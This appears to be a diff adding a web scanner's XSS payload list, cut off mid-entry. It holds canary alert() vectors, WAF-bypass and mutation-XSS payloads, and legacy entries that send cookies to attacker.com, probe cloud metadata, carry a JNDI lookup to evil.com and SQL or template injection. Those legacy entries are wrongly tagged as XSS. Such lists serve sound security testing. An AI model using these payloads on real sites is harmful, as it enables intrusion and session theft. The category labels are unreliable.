@@ -1,0 +1,3970 @@
+{
+  "version": "5.1.0",
+  "category": "xss",
+  "payloads": [
+    {
+      "id": "xss.html.script_basic",
+      "vector": "<script>alert('WSSc4n4ry7788')</script>",
+      "description": "Baseline script-tag injection in HTML text context.",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "expected_evidence": [
+        "<script>alert('WSSc4n4ry7788')</script>"
+      ],
+      "references": [
+        "https://portswigger.net/web-security/cross-site-scripting"
+      ],
+      "tags": [
+        "reflected",
+        "script"
+      ]
+    },
+    {
+      "id": "xss.html.img_onerror",
+      "vector": "<img src=x onerror=alert('WSSc4n4ry7788')>",
+      "description": "Image error handler, fires without user interaction.",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "tags": [
+        "reflected",
+        "onerror"
+      ]
+    },
+    {
+      "id": "xss.html.svg_onload",
+      "vector": "<svg onload=alert('WSSc4n4ry7788')>",
+      "description": "SVG onload handler.",
+      "context": "svg_event",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "tags": [
+        "reflected",
+        "svg"
+      ]
+    },
+    {
+      "id": "xss.html.body_onload",
+      "vector": "<body onload=alert('WSSc4n4ry7788')>",
+      "description": "Body onload handler.",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "tags": [
+        "reflected",
+        "onload"
+      ]
+    },
+    {
+      "id": "xss.html.details_ontoggle",
+      "vector": "<details open ontoggle=alert('WSSc4n4ry7788')>",
+      "description": "ontoggle on <details open> — often missed by static analysers (2025 class).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "waf_bypass": true,
+      "references": [
+        "https://medium.com/@gasmask/bypassing-wafs-in-2025-new-techniques-and-evasion-tactics-fdb3508e6b46"
+      ],
+      "tags": [
+        "reflected",
+        "ontoggle",
+        "waf-bypass"
+      ]
+    },
+    {
+      "id": "xss.attr.breakout_double",
+      "vector": "\"><script>alert('WSSc4n4ry7788')</script>",
+      "description": "Break out of a double-quoted attribute then inject a script tag.",
+      "context": "attribute",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "tags": [
+        "reflected",
+        "breakout"
+      ]
+    },
+    {
+      "id": "xss.attr.breakout_single",
+      "vector": "'><svg onload=alert('WSSc4n4ry7788')>",
+      "description": "Break out of a single-quoted attribute with an SVG handler.",
+      "context": "attribute",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "tags": [
+        "reflected",
+        "breakout"
+      ]
+    },
+    {
+      "id": "xss.attr.event_inject",
+      "vector": "\" autofocus onfocus=alert('WSSc4n4ry7788') x=\"",
+      "description": "Inject an event handler into an existing tag without closing it.",
+      "context": "attribute",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "tags": [
+        "reflected",
+        "attr-inject"
+      ]
+    },
+    {
+      "id": "xss.js.string_breakout_double",
+      "vector": "\";alert('WSSc4n4ry7788');//",
+      "description": "Break out of a double-quoted JS string literal.",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "tags": [
+        "script-context",
+        "breakout"
+      ]
+    },
+    {
+      "id": "xss.js.string_breakout_single",
+      "vector": "';alert('WSSc4n4ry7788');//",
+      "description": "Break out of a single-quoted JS string literal.",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "tags": [
+        "script-context",
+        "breakout"
+      ]
+    },
+    {
+      "id": "xss.js.template_literal",
+      "vector": "${alert('WSSc4n4ry7788')}",
+      "description": "Template-literal substitution when input lands inside backticks.",
+      "context": "js_template_literal",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "tags": [
+        "script-context",
+        "template-literal"
+      ]
+    },
+    {
+      "id": "xss.uri.javascript_scheme",
+      "vector": "javascript:alert('WSSc4n4ry7788')",
+      "description": "javascript: URI for href/src sinks.",
+      "context": "uri",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "href",
+        "scheme"
+      ]
+    },
+    {
+      "id": "xss.wafbypass.case_script",
+      "vector": "<ScRiPt>alert('WSSc4n4ry7788')</ScRiPt>",
+      "description": "Mixed-case tag name against case-sensitive filters.",
+      "context": "waf_bypass",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "case",
+        "filter-bypass"
+      ]
+    },
+    {
+      "id": "xss.wafbypass.html_entity_encoded",
+      "vector": "&#x3C;script&#x3E;alert('WSSc4n4ry7788')&#x3C;/script&#x3E;",
+      "description": "HTML-entity-encoded tag that bypasses raw-value inspection but decodes in the DOM.",
+      "context": "waf_bypass",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "LOW",
+      "severity": "High",
+      "waf_bypass": true,
+      "references": [
+        "https://medium.com/@gasmask/bypassing-wafs-in-2025-new-techniques-and-evasion-tactics-fdb3508e6b46"
+      ],
+      "tags": [
+        "encoding",
+        "filter-bypass"
+      ]
+    },
+    {
+      "id": "xss.wafbypass.no_space_svg",
+      "vector": "<svg/onload=alert('WSSc4n4ry7788')>",
+      "description": "Slash instead of space between tag and attribute.",
+      "context": "waf_bypass",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "no-space",
+        "svg"
+      ]
+    },
+    {
+      "id": "xss.wafbypass.eval_atob",
+      "vector": "<svg/onload=eval(atob('YWxlcnQoJ1dTU2M0bjRyeTc3ODgnKQ=='))>",
+      "description": "Base64-wrapped payload (decodes to alert('WSSc4n4ry7788')) with no quotes/spaces in the sink.",
+      "context": "waf_bypass",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": "YWxlcnQoJ1dTU2M0bjRyeTc3ODgnKQ==",
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "base64",
+        "no-quotes"
+      ]
+    },
+    {
+      "id": "xss.mxss.noscript",
+      "vector": "<noscript><p title=\"</noscript><img src=x onerror=alert('WSSc4n4ry7788')>\">",
+      "description": "Mutation XSS via <noscript> parsing differential (Kinugawa/DOMPurify class).",
+      "context": "mutation",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "waf_bypass": true,
+      "references": [
+        "https://github.com/SonarSource/mxss-cheatsheet/blob/master/examples.md"
+      ],
+      "tags": [
+        "mxss",
+        "noscript"
+      ]
+    },
+    {
+      "id": "xss.mxss.template",
+      "vector": "<template><s><template></template><img src=x onerror=alert('WSSc4n4ry7788')>",
+      "description": "mXSS via nested <template> content-fragment reparenting.",
+      "context": "mutation",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "mxss",
+        "template"
+      ]
+    },
+    {
+      "id": "xss.mathml.modern",
+      "vector": "<math><mtext><mglyph><style><!--</style><img src=x onerror=alert('WSSc4n4ry7788')>",
+      "description": "MathML mglyph/style parsing quirk for mXSS.",
+      "context": "mutation",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "LOW",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "mxss",
+        "mathml"
+      ]
+    },
+    {
+      "id": "xss.polyglot.owasp",
+      "vector": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('WSSc4n4ry7788') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('WSSc4n4ry7788')//>",
+      "description": "OWASP/RSnake-style polyglot that fires across many injection contexts.",
+      "context": "polyglot",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "canary": true,
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "waf_bypass": true,
+      "references": [
+        "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md"
+      ],
+      "tags": [
+        "polyglot"
+      ]
+    },
+    {
+      "id": "xss.polyglot.kinugawa",
+      "vector": "\">'><img src=x id=dmFyIGE9\"\" onerror=eval(atob(id.replace('dmFyIGE9','')))>",
+      "description": "Compact context-agnostic polyglot variant.",
+      "context": "polyglot",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "polyglot"
+      ]
+    },
+    {
+      "id": "xss.legacy.0000871bab",
+      "vector": "admin)(&",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.01105b6544",
+      "vector": "<iframe srcdoc='<script>confirm(1)</script>'></iframe>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.031e798d84",
+      "vector": "gopher://127.0.0.1:6379/_INFO",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.046c0df836",
+      "vector": "<svg><text onfocusin=alert(1)>X</text></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.05f64a4ced",
+      "vector": "<img src=x onerror=prompt(document.cookie)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.062f893da8",
+      "vector": "<iframe src='javascript:prompt(1)'></iframe>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.08b051feea",
+      "vector": "<svg><set attributeName=\"onmouseover\" to=\"alert(1)\"/><a><text x=\"20\" y=\"20\">XSS</text></a></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.096cd16926",
+      "vector": "{\"$gt\": \"\"}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.0abafc1799",
+      "vector": "<object type=\"text/x-scriptlet\" data=\"http://attacker/xss.html\"></object>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.0c0dc8ca2c",
+      "vector": "<svg/onload=confirm(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.0ccb496127",
+      "vector": "http://169.254.169.254/latest/meta-data/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ],
+      "oob": true
+    },
+    {
+      "id": "xss.legacy.0e94d56de8",
+      "vector": "<svg><script>alert(0)</script></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.0e9e746433",
+      "vector": "http://169.254.169.254",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ],
+      "oob": true
+    },
+    {
+      "id": "xss.legacy.0fcec10ec2",
+      "vector": "<img src=x onerror=alert('xss-injection')>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.10669443f7",
+      "vector": "<img src=x onerror=fetch('http://attacker.com/?c='+btoa(document.cookie))>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.1172d5dcfb",
+      "vector": "<esi:include src=\"http://evil.com/\" />",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.12e45fadca",
+      "vector": "<img src=x onerror=alert(window.location)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.133c7c5fc8",
+      "vector": "<iframe src=\"javascript:alert(1)\">",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.138a9d4d14",
+      "vector": "{\"$ne\": null}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.144ff34420",
+      "vector": "javascript://evil.com%0Aalert(1)",
+      "description": "Imported from the legacy corpus (uri).",
+      "context": "uri",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.147ddb4907",
+      "vector": "/proc/self/environ",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.14b47bdf4d",
+      "vector": "<svg/onload=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.15260f8517",
+      "vector": "${jndi:ldap://evil.com/a}",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ],
+      "oob": true
+    },
+    {
+      "id": "xss.legacy.152c2448da",
+      "vector": "javascript:alert(1)",
+      "description": "Imported from the legacy corpus (uri).",
+      "context": "uri",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.15a1a3baa6",
+      "vector": "<input onblur=alert(1) autofocus>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.167a80f498",
+      "vector": "http://127.0.0.1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.16e125f3a6",
+      "vector": "<img src=x onerror=alert('XSS')>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.179890bf19",
+      "vector": "http://metadata.azure.com/metadata/instance?api-version=2021-02-01",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.19f3316c3c",
+      "vector": "<svg><tspan oncopy=confirm(1)>X</tspan></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.1a06293a99",
+      "vector": "<img src=\"x\" style=\"-moz-binding:url('http://attacker.com/xss.xml#xss')\">",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.1a57adf55c",
+      "vector": "<img src=x onerror=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.1a78330c67",
+      "vector": "http://127.0.0.1@evil.com",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.1a9ff44d8d",
+      "vector": "<input type=image src=x onerror=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.1adcb4be80",
+      "vector": "<details ontoggle=alert(1) open>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.1b03f55ee6",
+      "vector": "<svg><foreignObject onload=alert(1)></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.1c0dd57f5a",
+      "vector": "php://input",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.1d661c7e30",
+      "vector": "admin' #",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.1e70b8c85f",
+      "vector": "http://localhost:27017",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.1f6909be52",
+      "vector": "' OR 1=1--",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.20ffd0a817",
+      "vector": "<svg><set onbegin=alert(1) attributeName=x to=1/></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.2165d44b2d",
+      "vector": "${T(java.lang.Runtime).getRuntime().exec('calc')}",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.23045a2c6e",
+      "vector": "';alert(1)//",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.23c2128109",
+      "vector": "<embed src=javascript:alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.249e7099c0",
+      "vector": "<script>eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vP2M9Jytkb2N1bWVudC5jb29raWUp'))</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.2643ab3734",
+      "vector": "<audio><source onerror=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.26ef0c1337",
+      "vector": "<script>(alert)(1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.280f540f24",
+      "vector": "<img src=x onerror=alert('xss-payload')>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.282f32a5ce",
+      "vector": "http://localhost:9200",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.2886ea036f",
+      "vector": "<link rel=import href=http://attacker.com/evil.html>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.28c5a71ab4",
+      "vector": "<object data=javascript:alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.290f0d85ed",
+      "vector": "{{7*7}}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.29742da845",
+      "vector": "<svg><animate attributeName=xlink:href values=javascript:alert(1) />",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.29ed5c4569",
+      "vector": "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.2a75a20f87",
+      "vector": "//evil.com",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.2a9b63616f",
+      "vector": "<svg><foreignObject onload=confirm(1)></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.2bdd2d010b",
+      "vector": "<video><source onerror=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.2dca9d64d8",
+      "vector": "<svg><handler xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\">alert(1)</handler></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.2edf17a44a",
+      "vector": "<a href='javascript:alert(1)'>Click me</a>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.31cc188fc6",
+      "vector": "'><script>alert(1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.327c432525",
+      "vector": "<img src=x onerror=alert('xss-attack')>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.32dc1f160a",
+      "vector": "%0d%0aSet-Cookie: sessionid=malicious",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.34cee24e1f",
+      "vector": "dict://localhost:11211/stat",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.363ee3cce0",
+      "vector": "<marquee onstart=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.36eaedf2e1",
